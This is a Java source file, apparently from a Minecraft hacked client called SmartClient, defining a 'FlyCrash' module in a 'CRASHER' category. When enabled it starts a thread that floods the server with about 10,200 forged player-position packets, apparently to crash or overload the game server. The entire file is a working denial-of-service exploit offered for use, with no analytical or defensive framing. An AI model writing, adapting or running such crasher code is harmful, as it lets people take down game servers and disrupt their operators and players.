package net.sssssssthedev.SmartClient.module.crasher;

import net.minecraft.network.play.client.C03PacketPlayer;
import net.sssssssthedev.SmartClient.module.Category;
import net.sssssssthedev.SmartClient.module.Module;
import org.lwjgl.input.Keyboard;

public class FlyCrash extends Module {
    public FlyCrash() {
        super("Fly", Keyboard.KEY_0, Category.CRASHER);
    }
    Thread t;

    public void onEnable() {
        crash();
        super.onEnable();
    }
    public void onDisable() {
        this.t.interrupt();
        super.onDisable();
    }

    private void crash() {
        this.t = new Thread(() -> {
            double itm = FlyCrash.this.mc.thePlayer.posX;
            double i = FlyCrash.this.mc.thePlayer.posY;
            double playerZ = FlyCrash.this.mc.thePlayer.posZ;
            double y = 0.0D;
            double z;
            int i1;
            for (i1 = 0; i1 < 200; i1++) {
                y = (i1 * 9);
                (FlyCrash.this.mc.getNetHandler().getNetworkManager()).channel.writeAndFlush(new C03PacketPlayer.C04PacketPlayerPosition(itm, i + y, playerZ, false));
            }
            for (i1 = 0; i1 < 10000; i1++) {
                z = (i1 * 9);
                (FlyCrash.this.mc.getNetHandler().getNetworkManager()).channel.writeAndFlush(new C03PacketPlayer.C04PacketPlayerPosition(itm, i + y, playerZ + z, false));
            }
        });
        this.t.start();
    }
}

